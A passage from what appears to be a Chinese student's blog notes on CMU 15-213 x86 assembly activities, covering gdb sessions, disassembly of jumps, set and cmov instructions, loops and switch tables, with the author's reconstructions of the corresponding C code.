这些指令的共同点就是都跳转到地址为 36 的destination处。此外，每个跳转指令的编码都是 2 个字节，第二个字节的值即为跳转的相对偏移地址，其值 = 目的地址 - 下一套指令的地址（因为执行到这里的时候 PC 已经指向下一条了），所以需要将该值增加到 PC 中，然后进行跳转。 接下来我们将.skip 97一行注释掉，然后再编译并且反汇编看看： text jumps.o: file format elf64-x86-64 Disassembly of section .text: 0000000000000000 \u003cjump_insns\u003e: 0: e9 bd 00 00 00 jmpq c2 \u003cdestination\u003e 5: 0f 80 b7 00 00 00 jo c2 \u003cdestination\u003e b: 0f 81 b1 00 00 00 jno c2 \u003cdestination\u003e 11: 0f 82 ab 00 00 00 jb c2 \u003cdestination\u003e 17: 0f 82 a5 00 00 00 jb c2 \u003cdestination\u003e 1d: 0f 82 9f 00 00 00 jb c2 \u003cdestination\u003e 23: 0f 83 99 00 00 00 jae c2 \u003cdestination\u003e 29: 0f 83 93 00 00 00 jae c2 \u003cdestination\u003e 2f: 0f 83 8d 00 00 00 jae c2 \u003cdestination\u003e 35: 0f 84 87 00 00 00 je c2 \u003cdestination\u003e 3b: 0f 84 81 00 00 00 je c2 \u003cdestination\u003e 41: 75 7f jne c2 \u003cdestination\u003e 43: 75 7d jne c2 \u003cdestination\u003e 45: 76 7b jbe c2 \u003cdestination\u003e 47: 76 79 jbe c2 \u003cdestination\u003e 49: 77 77 ja c2 \u003cdestination\u003e 4b: 77 75 ja c2 \u003cdestination\u003e 4d: 78 73 js c2 \u003cdestination\u003e 4f: 79 71 jns c2 \u003cdestination\u003e 51: 7c 6f jl c2 \u003cdestination\u003e 53: 7c 6d jl c2 \u003cdestination\u003e 55: 7d 6b jge c2 \u003cdestination\u003e 57: 7d 69 jge c2 \u003cdestination\u003e 59: 7e 67 jle c2 \u003cdestination\u003e 5b: 7e 65 jle c2 \u003cdestination\u003e 5d: 7f 63 jg c2 \u003cdestination\u003e 5f: 7f 61 jg c2 \u003cdestination\u003e ... 00000000000000c2 \u003cdestination\u003e: c2: c3 retq Oracle 的 x86 Assembly Language Reference Manual中写道： .skip integer, value While generating values for any data section, the .skip directive causes integer bytes to be skipped over, or, optionally, filled with the specified value. 将 97 改为 98，再次处理后查看： text jumps.o: file format elf64-x86-64 Disassembly of section .text: 0000000000000000 \u003cjump_insns\u003e: 0: e9 c2 00 00 00 jmpq c7 \u003cdestination\u003e 5: 0f 80 bc 00 00 00 jo c7 \u003cdestination\u003e b: 0f 81 b6 00 00 00 jno c7 \u003cdestination\u003e 11: 0f 82 b0 00 00 00 jb c7 \u003cdestination\u003e 17: 0f 82 aa 00 00 00 jb c7 \u003cdestination\u003e 1d: 0f 82 a4 00 00 00 jb c7 \u003cdestination\u003e 23: 0f 83 9e 00 00 00 jae c7 \u003cdestination\u003e 29: 0f 83 98 00 00 00 jae c7 \u003cdestination\u003e 2f: 0f 83 92 00 00 00 jae c7 \u003cdestination\u003e 35: 0f 84 8c 00 00 00 je c7 \u003cdestination\u003e 3b: 0f 84 86 00 00 00 je c7 \u003cdestination\u003e 41: 0f 85 80 00 00 00 jne c7 \u003cdestination\u003e 47: 75 7e jne c7 \u003cdestination\u003e 49: 76 7c jbe c7 \u003cdestination\u003e 4b: 76 7a jbe c7 \u003cdestination\u003e 4d: 77 78 ja c7 \u003cdestination\u003e 4f: 77 76 ja c7 \u003cdestination\u003e 51: 78 74 js c7 \u003cdestination\u003e 53: 79 72 jns c7 \u003cdestination\u003e 55: 7c 70 jl c7 \u003cdestination\u003e 57: 7c 6e jl c7 \u003cdestination\u003e 59: 7d 6c jge c7 \u003cdestination\u003e 5b: 7d 6a jge c7 \u003cdestination\u003e 5d: 7e 68 jle c7 \u003cdestination\u003e 5f: 7e 66 jle c7 \u003cdestination\u003e 61: 7f 64 jg c7 \u003cdestination\u003e 63: 7f 62 jg c7 \u003cdestination\u003e ... 00000000000000c7 \u003cdestination\u003e: c7: c3 retq 下一个问题是：为什么会这样？指令eb f0又是做什么的？This happens for each instruction that needs to encode a change in %r","date":"2024-02-29","objectID":"/machine-control-activity/:1:0","series":["15-213"],"tags":["x86汇编","逆向工程"],"title":"Machine control activity","uri":"/machine-control-activity/#basic-control-flow"},{"categories":["系统入门"],"content":" 7 Comparisons and Conditional Set Instructions运行gdb ./cmp-set，输入r，提示如下： text (gdb) r Starting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/machine-control/cmp-set This program should be run inside GDB: $ gdb /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/machine-control/cmp-set (gdb) r If you didn't run it that way, it will now crash. Otherwise, you will get the (gdb) prompt back. Type 'c' (short for 'continue') at the (gdb) prompt. Program received signal SIGTRAP, Trace/breakpoint trap. main (argc=\u003coptimized out\u003e, argv=\u003coptimized out\u003e) at machine-control/cmp-set.c:43 43 machine-control/cmp-set.c: No such file or directory. 输入c，提示如下： text (gdb) c Continuing. Besides 'main', this program defines three functions: 'sete', 'seta', and 'setg'. Use the 'disassemble' command on each to see their code. Then, as instructed in the handout, use the 'call' command to call them with various arguments. When you have answered all the questions in this section of the handout, use the 'c' command to go on. Program received signal SIGTRAP, Trace/breakpoint trap. main (argc=\u003coptimized out\u003e, argv=\u003coptimized out\u003e) at machine-control/cmp-set.c:45 45 in machine-control/cmp-set.c 分别使用disassemble命令来查看sete,seta和setg三条指令，使用call命令来调用他们，完成任务后使用c来继续。 sete反汇编结果如下： asm (gdb) disassemble sete Dump of assembler code for function sete: 0x0000000000401178 \u003c+0\u003e: cmp %si,%di 0x000000000040117b \u003c+3\u003e: sete %al 0x000000000040117e \u003c+6\u003e: movzbl %al,%eax 0x0000000000401181 \u003c+9\u003e: retq End of assembler dump. 在sete中，%si和%di包含参数，%eax中包含返回值。该函数的 C 代码还原如下： 这里到底是uint16_t还是int16_t?有区别吗? c #include \u003cstdint.h\u003e sete(uint16_t si, uint16_t di) { return si == di; } seta函数的反汇编结果如下： text (gdb) disassemble seta Dump of assembler code for function seta: 0x000000000040118c \u003c+0\u003e: cmp %si,%di 0x000000000040118f \u003c+3\u003e: seta %al 0x0000000000401192 \u003c+6\u003e: movzbl %al,%eax 0x0000000000401195 \u003c+9\u003e: retq End of assembler dump. seta比较的是无符号数，其 C 语言代码如下： c #include \u003cstdint.h\u003e sete(uint16_t si, uint16_t di) { return di \u003e si; } setg函数的反汇编结果如下： text (gdb) disassemble setg Dump of assembler code for function setg: 0x0000000000401182 \u003c+0\u003e: cmp %si,%di 0x0000000000401185 \u003c+3\u003e: setg %al 0x0000000000401188 \u003c+6\u003e: movzbl %al,%eax 0x000000000040118b \u003c+9\u003e: retq End of assembler dump. setg比较的是有符号数，其 C 语言代码如下： c #include \u003cstdint.h\u003e sete(int16_t si, int16_t di) { return di \u003e si; } 注意setg和seta有区别。 对不同组别的值分别调用sete,seta和setg，其值如下： arg1 arg2 sete setg seta 0 0 1 - - 0 1 - - - 1 0 - 1 1 -1 0 - - 1 0 -1 - 1 - 32768 32767 - - 1 32767 32768 - 1 - 32768 32768 1 - - 32768 −32768 1 - - −32768 32768 1 - - −32768 −32768 1 - - 从-1和0的两行比较可以看得出来，seta是先将负数转化为unsigned类型的数，然后再相减。当数字的值超过signed类型范围后，会转化为负数，然后再比较。此处32768在进行有符号数比较时都被转化为-32768了 ","date":"2024-02-29","objectID":"/machine-control-activity/:2:0","series":["15-213"],"tags":["x86汇编","逆向工程"],"title":"Machine control activity","uri":"/machine-control-activity/#comparisons-and-conditional-set-instructions"},{"categories":["系统入门"],"content":" 8 Tests and Conditional Move Instructions输入下列指令开启当前 Activity: text $ gdb ./test-cmov (gdb) r 得到如下提示： text (gdb) r Starting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/machine-control/test-cmov This program should be run inside GDB: $ gdb /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/machine-control/test-cmov (gdb) r If you didn't run it that way, it will now crash. Otherwise, you will get the (gdb) prompt back. Type 'c' (short for 'continue') at the (gdb) prompt. Program received signal SIGTRAP, Trace/breakpoint trap. main (argc=\u003coptimized out\u003e, argv=\u003coptimized out\u003e) at machine-control/test-cmov.c:43 43 machine-control/test-cmov.c: No such file or directory. (gdb) 输入c继续，得到如下提示： text (gdb) c Continuing. Besides 'main', this program defines three functions: 'cmove', 'cmovs', and 'cmovc'. Use the 'disassemble' command on each to see their code. Then, as instructed in the handout, use the 'call' command to call them with various arguments. When you have answered all the questions in this section of the handout, use the 'c' command to go on. Program received signal SIGTRAP, Trace/breakpoint trap. main (argc=\u003coptimized out\u003e, argv=\u003coptimized out\u003e) at machine-control/test-cmov.c:45 45 in machine-control/test-cmov.c 对cmove，cmovs和cmovc三个函数分别进行反汇编可以得到如下结果： asm (gdb) disassemble cmove Dump of assembler code for function cmove: 0x00000000004005b3 \u003c+0\u003e: mov $0x0,%eax 0x00000000004005b8 \u003c+5\u003e: test %di,%di 0x00000000004005bb \u003c+8\u003e: cmove %esi,%eax 0x00000000004005be \u003c+11\u003e: retq End of assembler dump. (gdb) disassemble cmovs Dump of assembler code for function cmovs: 0x00000000004005bf \u003c+0\u003e: mov $0x0,%eax 0x00000000004005c4 \u003c+5\u003e: test %di,%di 0x00000000004005c7 \u003c+8\u003e: cmovs %esi,%eax 0x00000000004005ca \u003c+11\u003e: retq End of assembler dump. (gdb) disassemble cmovc Dump of assembler code for function cmovc: 0x00000000004005cb \u003c+0\u003e: mov $0x0,%eax 0x00000000004005d0 \u003c+5\u003e: test %di,%di 0x00000000004005d3 \u003c+8\u003e: cmovb %esi,%eax 0x00000000004005d6 \u003c+11\u003e: retq End of assembler dump. 首先我们需要了解cmov三条指令分别是做什么的，可以参见 其中cmove是当ZF = 1时为 1（相等或等于 0），cmovs是当SF = 1时为 1（为负数），cmovb时当CF = 1时为 1（低于，无符号\u003c）。上述三个函数的两个传入参数是%di和%esi。若%di满足条件，则将返回值设置为%esi。否则%eax = 0。由此可得，arg1是%di,arg2是%esi。 Q1: 为什么cmovc中使用的是cmovb指令？因为cmovc指令的意义是move if carry Q2: test指令使用的什么寄存器？使用的是%di，2 个字节。 接下来填表： Arg 1(%di) Arg 2(%esi) cmove(相等/0) cmovs(负数) cmovb(无符号\u003c) 0 0 0 1 1 0 2 2 1 0 1 1 1 2 −1 0 0 −1 1 1 −1 2 2 32767 1 32768 1 1 未填写部分全为 0。从上表我们可以看到cmove只有在%di等于 0 时，才会等于%esi。而%esi只有在为%di负数时，才会等于%esi（此外，如果%di的值超过了有符号数的上界，如32768，那么其会被转化为-32768，也就是最后一行，那么%di也是负数，因此%eax被赋值为 1）。此外，cmovb一直等于 0，因为这里没有无符号的小于。 ","date":"2024-02-29","objectID":"/machine-control-activity/:3:0","series":["15-213"],"tags":["x86汇编","逆向工程"],"title":"Machine control activity","uri":"/machine-control-activity/#tests-and-conditional-move-instructions"},{"categories":["系统入门"],"content":" 9 Loops按照 handout 提示输入objdump -d loops.o，得到如下结果： asm loops.o: file format elf64-x86-64 Disassembly of section .text: 0000000000000000 \u003cforLoop\u003e: 0: ba 00 00 00 00 mov $0x0,%edx 5: b8 00 00 00 00 mov $0x0,%eax a: 39 f0 cmp %esi,%eax c: 7d 0b jge 19 \u003cforLoop+0x19\u003e e: 48 63 c8 movslq %eax,%rcx 11: 03 14 8f add (%rdi,%rcx,4),%edx 14: 83 c0 01 add $0x1,%eax 17: eb f1 jmp a \u003cforLoop+0xa\u003e 19: 89 d0 mov %edx,%eax 1b: c3 retq 该汇编代码的 C 语言形式如下： c int forLoop(int* x, int len) { int ret = 0; for (i = 0; i \u003c len; i++) { ret += x[i]; } return ret; } text 000000000000001c \u003cwhileLoop\u003e: 1c: ba 00 00 00 00 mov $0x0,%edx 21: b8 00 00 00 00 mov $0x0,%eax 26: 39 f0 cmp %esi,%eax 28: 7d 0b jge 35 \u003cwhileLoop+0x19\u003e 2a: 48 63 c8 movslq %eax,%rcx 2d: 03 14 8f add (%rdi,%rcx,4),%edx 30: 83 c0 01 add $0x1,%eax 33: eb f1 jmp 26 \u003cwhileLoop+0xa\u003e 35: 89 d0 mov %edx,%eax 37: c3 retq 该循环的 C 形式代码如下： c int whileLoop (int* x, int len) { int ret = 0; while (i \u003c len) { ret += x[i]; i++; } return ret; } text 0000000000000038 \u003cdoWhileLoop\u003e: 38: ba 00 00 00 00 mov $0x0,%edx 3d: b8 00 00 00 00 mov $0x0,%eax 42: 48 63 c8 movslq %eax,%rcx 45: 03 14 8f add (%rdi,%rcx,4),%edx 48: 83 c0 01 add $0x1,%eax 4b: 39 f0 cmp %esi,%eax 4d: 7c f3 jl 42 \u003cdoWhileLoop+0xa\u003e 4f: 89 d0 mov %edx,%eax 51: c3 retq doWhileLoop的 C 循环代码如下： c int doWhileLoop (int* x, int len) { int ret = 0; int i = 0; do { ret += x[i]; i++; } while (i \u003c len); return ret; } ","date":"2024-02-29","objectID":"/machine-control-activity/:4:0","series":["15-213"],"tags":["x86汇编","逆向工程"],"title":"Machine control activity","uri":"/machine-control-activity/#loops"},{"categories":["系统入门"],"content":" 10 Switch Statementsswitch语句汇编代码如下： asm switcher: cmpq $7 , %rdi ja .L2 jmp *.L4(, %rdi , 8) .L7: xorq $15 , %rsi movq %rsi , %rdx .L3: leaq 112(% rdx), %rdi jmp .L6 .L5: leaq (%rdx , %rsi), %rdi salq $2 , %rdi jmp .L6 .L2: movq %rsi , %rdi .L6: movq %rdi , (% rcx) ret .section .rodata .L4: .quad .L3 ;;x = 0 -\u003e rdi = rdx + 112; break; .quad .L2 ;;x = 1 -\u003e default .quad .L5 ;;x = 2 -\u003e rdi = rdx + rsi; rdi = rdi \u003c\u003c 2; break; .quad .L2 ;;x = 3 -\u003e default .quad .L6 ;;x = 4 -\u003e *rcx = rdi; break; .quad .L7 ;;x = 5 -\u003e rsi = rsi ^ 15; rdx = rsi; .quad .L2 ;;x = 6 -\u003e default .quad .L5 ;;x = 7 -\u003e rdi = rdx + rsi; rdi = rdi \u003c\u003c 2; break; 其还原的 C 语句代码如下： c // 1, 3, 6没有；只有 0，2，4，5，7 // %rdi = a and val , %rsi = b, %rdx = c, %rcx = dest void switcher(long a, long b, long c, long *dest) { long val; switch (a) { case 5: c = b ^ 15; case 0: val = c + 112; break; case 2: case 7: val = (c + b) \u003c\u003c 2; break; case 4: val = a; break; default: val = b; } *dest = val; } 注意case 4中，按理来说.L4时val = a而不是*dest = val（汇编来看）。这里我们再将 C 编译成汇编语句时，对 C 语言的语句做了一个优化，将*dest = val转化为两句： c val = a; *dest = val; 这样转化的原因是在 C 语言中*dest = val是所有语句共同需要执行的部分，因此我们将它放在switch语句之外，而将val = a放在语句内。这样语句前后意思是一样的，而switch语句的目的也达到了。而汇编层面做了优化，将*dest = val直接放在.L6处，其他语句执行完后跳转到.L6。 ","date":"2024-02-29","objectID":"/machine-control-activity/:5:0","series":["15-213"],"tags":["x86汇编","逆向工程"],"title":"Machine control activity","uri":"/machine-control-activity/#switch-statements"},{"categories":["系统入门"],"content":" 3 Part I输入如下命令： text $ gcc -o phase1 -g -std=c99 phase1.c $ gdb ./phase1 按照 handout 依次输入命令并观察结果。 ","date":"2024-02-29","objectID":"/bomb-lab-activity/:1:0","series":["15-213"],"tags":["x86汇编","逆向工程"],"title":"Bomb lab activity","uri":"/bomb-lab-activity/#part-i"},{"categories":["系统入门"],"content":" 3.1 打断点 text (gdb) break main Breakpoint 1 at 0x13b2: file phase1.c, line 54. (gdb) break unscramble Breakpoint 2 at 0x1308: file phase1.c, line 39. (gdb) break reverse Breakpoint 3 at 0x1274: file phase1.c, line 30. (gdb) break toggleCase Breakpoint 4 at 0x11e7: file phase1.c, line 18. (gdb) info break Num Type Disp Enb Address What 1 breakpoint keep y 0x00000000000013b2 in main at phase1.c:54 2 breakpoint keep y 0x0000000000001308 in unscramble at phase1.c:39 3 breakpoint keep y 0x0000000000001274 in reverse at phase1.c:30 4 breakpoint keep y 0x00000000000011e7 in toggleCase at phase1.c:18 ","date":"2024-02-29","objectID":"/bomb-lab-activity/:1:1","series":["15-213"],"tags":["x86汇编","逆向工程"],"title":"Bomb lab activity","uri":"/bomb-lab-activity/#打断点"},{"categories":["系统入门"],"content":" 3.2 运行程序 \u0026 打印值 text (gdb) run Starting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/lab2_handout/phase1 Breakpoint 1, main () at phase1.c:54 54 int main () { (gdb) n 55 word_t *secret_msg = (word_t *) calloc(1, sizeof(word_t)); (gdb) n 56 secret_msg-\u003estr = (char *) calloc(length, sizeof(char)); (gdb) print *(word_t*)secret_msg $1 = {str = 0x0, len = 0} (gdb) next 57 strncpy(secret_msg-\u003estr, \"!312 Av XPHy QBBt\", length);; (gdb) print *(word_t*)secret_msg $2 = {str = 0x5555555592c0 \"\", len = 0} ","date":"2024-02-29","objectID":"/bomb-lab-activity/:1:2","series":["15-213"],"tags":["x86汇编","逆向工程"],"title":"Bomb lab activity","uri":"/bomb-lab-activity/#运行程序--打印值"},{"categories":["系统入门"],"content":" 3.3 单步调试 \u0026 watchpoint text Breakpoint 2, unscramble (msg=0x555555555480 \u003c__libc_csu_init\u003e) at phase1.c:39 39 void unscramble (word_t *msg) { (gdb) step 41 char chng = 13; (gdb) next 42 for (int i = 0; i \u003c msg-\u003elen; i++) { (gdb) next 43 ltr = msg-\u003estr[i]; (gdb) print(ltr) $3 = 85 'U' (gdb) print isAlpha(ltr) $4 = true (gdb) watch ltr Hardware watchpoint 5: ltr (gdb) c Continuing. Hardware watchpoint 5: ltr Old value = 85 'U' New value = 33 '!' unscramble (msg=0x5555555592a0) at phase1.c:44 44 if (isAlpha(ltr)) { (gdb) step isAlpha (ltr=85 'U') at phase1.c:13 13 bool isAlpha (char ltr) { (gdb) backtrace #0 isAlpha (ltr=85 'U') at phase1.c:13 #1 0x0000555555555345 in unscramble (msg=0x5555555592a0) at phase1.c:44 #2 0x0000555555555429 in main () at phase1.c:60 ","date":"2024-02-29","objectID":"/bomb-lab-activity/:1:3","series":["15-213"],"tags":["x86汇编","逆向工程"],"title":"Bomb lab activity","uri":"/bomb-lab-activity/#单步调试--watchpoint"},{"categories":["系统入门"],"content":" 3.4 3 Questions What does unscramble(word_t *msg) do? And how? 将secret_msg指向的结构体中的!312 Av XPHy QBBt替换成了!312 Ni KCUl DOOg。 unscramble的作用是：判断msg_str当前的字符，如果M \u003c ltr \u003c= Z，就将其字符值减去 13。否则加上 13。 What does reverse(word_t *msg) do? And how? 将secret_msg指向的结构体中的!312 Ni KCUl DOOg替换成了gOOD lUCK iN 213!。该函数反转字符串。 What does toggleCase(word_t *msg) do? And how? 将secret_msg指向的结构体中的gOOD lUCK iN 213!替换成了Good Luck In 213!。该函数反转字符串大小写。 ","date":"2024-02-29","objectID":"/bomb-lab-activity/:1:4","series":["15-213"],"tags":["x86汇编","逆向工程"],"title":"Bomb lab activity","uri":"/bomb-lab-activity/#3-questions"},{"categories":["系统入门"],"content":" 4 Part II输入gcc -std=c99 -o phase2 -g phase2.c编译生成phase2，对其利用gdb进行排错发现S-\u003etop-\u003elen为 0，导致浮点数相除时发生错误。我们进行如下修改： 在初始化栈的时候让栈顶的长度为 0 push新结点的时候让结点的len为栈顶结点的长度加 1，然后让栈顶指向结点 pop时结点弹出，栈顶指向的新结点的长度值为弹出结点长度减 1 ","date":"2024-02-29","objectID":"/bomb-lab-activity/:2:0","series":["15-213"],"tags":["x86汇编","逆向工程"],"title":"Bomb lab activity","uri":"/bomb-lab-activity/#part-ii"},{"categories":["系统入门"],"content":" 4 Activity 1运行 bash gdb ./act1 (gdb) r 1 出现如下提示: text If you have questions about the commands, type (gdb) help \u003ccommand\u003e Now type (gdb) info registers This will display all of the integer registers. Registers are basically the only local \"variables\" in assembly. They are not located in memory, but instead directly within the CPU core. As such, they have no memory addresses and are referred to by name. Although historically each register had a special purpose, now only %rsp does. It points to the top of the stack. Look over the other registers: do any of them have familiar values, such as 1? Q. Given the information that GDB just stopped the program at the beginning of a function taking one or more arguments, write down your best guess at the purposes of the %rsp, %rdi, and %rax registers. During this activity, gdb will print ... SIGTRAP .... This is expected. It indicates that the program, such as act1, triggered a breakpoint. When you are finished looking at the registers, type r 2 \u003center\u003e GDB may ask you if you want to start the program from the beginning (y or n) y Program received signal SIGTRAP, Trace/breakpoint trap. 根据提示，输入info registers后，显示值如下： bash (gdb) info registers rax 0x4f 79 rbx 0x0 0 rcx 0x7ffff7ec3297 140737352839831 rdx 0x0 0 rsi 0x6042a0 6308512 rdi 0x1 1 rbp 0x0 0x0 rsp 0x7fffffffde40 0x7fffffffde40 r8 0x4f 79 r9 0x39 57 r10 0x400397 4195223 r11 0x246 582 r12 0x400590 4195728 r13 0x7fffffffdf40 140737488346944 r14 0x0 0 r15 0x0 0 rip 0x40077f 0x40077f \u003cprintStep2+191\u003e eflags 0x246 [ PF ZF IF ] cs 0x33 51 ss 0x2b 43 ds 0x0 0 es 0x0 0 --Type \u003cRET\u003e for more, q to quit, c to continue without paging-- fs 0x0 0 gs 0x0 0 该处%rdi寄存器的值为 1，%rsp的值为0x7fffffffde40,%rax的值为79。%rsp寄存器中存储的值应当是地址，%rax中存储返回值，%rdi中存储传入参数。 接下来输入r 2。提示信息如下： text (gdb) r 2 The program being debugged has been started already. Start it from the beginning? (y or n) y Starting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/gdb-and-assembly/act1 2 Let's look at some assembly and registers. There are two styles of assembly printing: AT\u0026T and Intel AT\u0026T prints OP SRC, DEST, while Intel prints OP DEST, SRC OP - opcode or instruction such as mov, ret, add, etc SRC - source or input, instructions may have 0, 1, or 2 sources DEST - destination, update this location, instructions may have 0 or 1 destinations Linux is based on Unix which was originally developed at Bell Labs, so GNU tools default to AT\u0026T style printing. Also, sometimes a DEST is also a SRC, kind of like x += 5 Type (gdb) c This will continue execution, please do so after each question. Program received signal SIGTRAP, Trace/breakpoint trap. 该提示介绍了一下AT \u0026 T格式和intel格式的区别，主要是src和dest的位置不一样。按照提示输入c查看： text (gdb) c Continuing. You will commonly dissassemble a function. There will be a header and footer. Most of the output will be 0x....... \u003c+0\u003e: OP SRC, DEST This indicates that at address 0x..., which is 0 bytes from the start of the function, there is an instruction OP with SRC and DEST as shown. Type (gdb) disassemble squareInt MOV is a common and powerful instruction. It can \"move\" (actually, copy) values between registers, load from memory, or store to memory. In this case, %edi holds the argument to the function and %eax its return value. Q. Fill in the blank in the pseudo C code for this function. Program received signal SIGTRAP, Trace/breakpoint trap. 输入disassemble squareInt，得到如下结果： asm (gdb) disassemble squareInt Dump of assembler code for function squareInt: 0x00000000004009c3 \u003c+0\u003e: mov %edi,%eax 0x00000000004009c5 \u003c+2\u003e: imul %edi,%eax 0x00000000004009c8 \u003c+5\u003e: retq End of assembler dump. 提示说%edi holds the argument to the function and %eax its return value，那么还原squareInt函数如下： c // x in %edi, return value in %eax int squareInt(int x) { return x * x; } 输入c，提示 text (gdb) c Continuing. Type (gdb) disassemble squareLInt (Note the L before Int) Q. How do the names of the registers differ between the functions? Program received signal SIGTRAP, Trace/breakpoint trap. ","date":"2024-02-29","objectID":"/gdb-asm-activity/:1:0","series":["15-213"],"tags":["gdb","x86汇编","逆向工程"],"title":"gdb \u0026 asm activity","uri":"/gdb-asm-activity/#activity-1"},{"categories":["系统入门"],"content":" 5 Activity 2输入./act2，提示显示Did whatIsThis(): compare, swap, add, or multiply two numbers? Enter the keyword corresponding to the correct operation. ，根据上一问结果，输入swap。因为whatIsThis交换了两个变量的值。提示Correct! Please rerun in gdb with r s. 输入gdb ./act2，再输入r s，提示如下： text (gdb) r s Starting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/gdb-and-assembly/act2 s We are going to learn about memory access. First, displacements. A displacement is an immediate added to a memory access. It is of the form: D(mem), so that the address accessed is D + mem. Please disassemble viewThis. Q. What are the function's argument(s)? Q. What is the return register of the function? Q. Which instruction(s) initialize the return register? Q. What does the function do? After you have your answer, please rerun with r a. Program received signal SIGTRAP, Trace/breakpoint trap. 提示要求我们反汇编viewThis函数，并且回答四个问题。输入disassemble viewThis，显示如下： text (gdb) disassemble viewThis Dump of assembler code for function viewThis: 0x0000000000400687 \u003c+0\u003e: mov 0x4(%rdi),%eax 0x000000000040068a \u003c+3\u003e: add (%rdi),%eax 0x000000000040068c \u003c+5\u003e: add 0x8(%rdi),%eax 0x000000000040068f \u003c+8\u003e: add 0xc(%rdi),%eax 0x0000000000400692 \u003c+11\u003e: retq End of assembler dump. 四个问题的回答分别是： text Q1: 函数的参数在M[%rdi + 4],M[%rdi],M[%rdi + 8],M[%rdi + 12]中 Q2: 函数返回值在%eax中 Q3: mov 0x4(%rdi),%eax 指令初始化了返回值寄存器%rax Q4: 对一个4个int类型的数组求和 根据提示，输入r a，提示信息如下： text (gdb) r a The program being debugged has been started already. Start it from the beginning? (y or n) y Starting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/gdb-and-assembly/act2 a Since viewThis added 4 numbers from an array, let's look at more array accesses. The general form of a memory reference is D(B,I,S) D + B + I * S Disassemble: viewThisNext. Q. What does this function do? We are going to call this function with array: arr. Print its address with: p/x \u0026arr Then continue. Program received signal SIGTRAP, Trace/breakpoint trap. 上一题答对啦：viewThis就是累加 4 个 int 类型元素的数组。输入disassemble viewThisNext，显示如下： text (gdb) disassemble viewThisNext Dump of assembler code for function viewThisNext: 0x0000000000400693 \u003c+0\u003e: mov (%rdi,%rsi,4),%eax 0x0000000000400696 \u003c+3\u003e: retq End of assembler dump. 上述代码的逻辑为：`int ret = *(rdi + rsi * 4); 因为汇编代码是从字节出发，而C代码的指针递增，每次加sizeof(T)个字节。这里是4,那么推测sizeof(T) = 4，这里的类型应该是 int。那么%rdi应该是数组的起始位置，%rsi等于要取的数字的索引，最后返回到%eax中。其 C 语言描述如下： c int get_val(int* arr,long index) { return arr[index]; } 输入p/x \u0026arr，结果如下： text (gdb) p/x \u0026arr $1 = 0x602080 输入x/10d \u0026arr来打印从arr地址开始处后 10 个整数。显示结果如下： text (gdb) x/10d \u0026arr 0x602080 \u003carr\u003e: 0 1 2 3 0x602090 \u003carr+16\u003e: 4 5 6 7 0x6020a0 \u003carr+32\u003e: 8 9 可以看到 arr 地址开始后存储了 10 个整数，从 0 到 9。输入c继续，提示显示： text (gdb) c Continuing. Now we'll actually call viewThisNext. Please input a number between 0 and 9. 5 You requested: 0x602094 = 5 Now rerun with r L. [Inferior 1 (process 42895) exited normally] 我想要 5，该值在 0x605094 位置处。输入r L。提示如下： text (gdb) r L Starting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/gdb-and-assembly/act2 L Many times, the compiler will need to compute the address before it is used. The instruction LEA provides this capability. Disassemble: viewThisL. It does the same calculation as before, except it passes along the pointer. Once you're done looking at the disassembly dump, continue. Program received signal SIGTRAP, Trace/breakpoint trap. 输入diassemble viewThisL后，提示显示： text (gdb) disassemble viewThisL Dump of assembler code for function viewThisL: 0x0000000000400697 \u003c+0\u003e: sub $0x8,%rsp 0x000000000040069b \u003c+4\u003e: lea (%rdi,%rsi,4),%rdi 0x000000000040069f \u003c+8\u003e: callq 0x4004e0 \u003cfree@plt\u003e 0x00000000004006a4 \u003c+13\u003e: add $0x8,%rsp 0x00000000004006a8 \u003c+17\u003e: retq End of assembler dump. 输入c，提示如下： text (gdb) c Continuing. LEA can also be used to do actual math. The function mx mutliplies its argument by some value. Note the use of the SHL instruction to left shift. Disassemble: mx. Q. Write down the four parts of LEA's displacement-mode addr","date":"2024-02-29","objectID":"/gdb-asm-activity/:2:0","series":["15-213"],"tags":["gdb","x86汇编","逆向工程"],"title":"gdb \u0026 asm activity","uri":"/gdb-asm-activity/#activity-2"},{"categories":["系统入门"],"content":" 6 Activity 3接下来，退出 gdb，并且输入head -n 8 act3.c。显示如下： text // // This quick activity looks at compilation and assembly. // type gcc -Og -S act3.c // Then view act3.s in your favorite editor // Notice the assembly is there, plus some other lines. // Now compile with gcc -Og -c act3.c // Then type objdump -d act3.o // 根据提示，输入gcc -Og -S act3.c，然后输入objdump -d act3.o。显示如下： asm act3.o: file format elf64-x86-64 Disassembly of section .text: 0000000000000000 \u003cmx\u003e: 0: f3 0f 1e fa endbr64 4: 48 8d 04 7f lea (%rdi,%rdi,2),%rax 8: 48 c1 e0 02 shl $0x2,%rax c: c3 retq 000000000000000d \u003caddm\u003e: d: f3 0f 1e fa endbr64 11: e8 00 00 00 00 callq 16 \u003caddm+0x9\u003e 16: 48 83 c0 01 add $0x1,%rax 1a: c3 retq ","date":"2024-02-29","objectID":"/gdb-asm-activity/:3:0","series":["15-213"],"tags":["gdb","x86汇编","逆向工程"],"title":"gdb \u0026 asm activity","uri":"/gdb-asm-activity/#activity-3"},{"categories":["系统入门"],"content":" Tip 本节内容部分章节尚未完善。 ","date":"2024-02-29","objectID":"/ch3/:0:0","series":["15-213"],"tags":["x86汇编","逆向工程"],"title":"CSAPP Ch3：程序的机器级表示","uri":"/ch3/#"},{"categories":["系统入门"],"content":" 11 导言学习汇编代码，我们能够理解编译器的优化能力，并分析代码中隐含的低效率。高级语言提供的抽象层会隐藏我们想要了解的程序的行为。另外一个例子，程序遭受攻击的许多方式中，都涉及程序存储运行时控制信息的方式的细节。 ","date":"2024-02-29","objectID":"/ch3/:1:0","series":["15-213"],"tags":["x86汇编","逆向工程"],"title":"CSAPP Ch3：程序的机器级表示","uri":"/ch3/#导言"},{"categories":["系统入门"],"content":" 12 程序编码gcc的转化过程： C预处理器扩展源代码，插入所有#include命令指定的文件，并扩展所有用#define声明指定的宏； 其次，编译器产生每个源文件的汇编代码； 接下来，汇编器将汇编代码转化为二进制目标代码文件；目标代码是机器代码的一种形式，包含所有指令的二进制表示，但是还没有填入全局值的地址； 